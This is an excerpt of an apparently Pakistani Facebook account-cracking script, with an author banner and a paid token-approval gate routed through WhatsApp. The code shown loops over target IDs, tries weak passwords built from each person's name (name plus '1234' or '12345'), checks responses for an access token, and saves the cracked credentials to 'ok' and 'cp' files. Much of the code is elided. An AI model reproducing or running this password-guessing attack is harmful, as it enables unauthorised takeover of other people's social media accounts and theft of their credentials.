...
║╚╗║╔╗║║╠╣║║╗╣╠══║╔║║╗
╚═╝╚╝╚╝╚╝╚╝╚╩╝╚══╝╚══╝
\x1b[1;97m_______________________________________
|Author   | CHARSI NASHI    |
|Fb Id      |   CHARSI |
|GitHub     |   CharsiBrand          |
|Version      |        0.01               |
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://raw.githubusercontent.com/itz-Sohailo/Try/main/apprv.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        print(' WhatsApp : +03110760985')
        input('\033[1;97m Press Enter To Send Token')
        os.system('xdg-open https://wa.me/+923403470593?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
        reg()
...
def reg2():
    ...
    print (' Token : ' + id)
    print(' WhatsApp : +923110760985')
    input(' Press Enter To Send Token ')
    os.system('xdg-open https://wa.me/+923110760985?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mCharsi-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mCharsi-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [Mehar] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[Mehar-CP] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [Charsi] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"1234", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"1234", xz[0]+xz[1], xz[0]+"12345"]
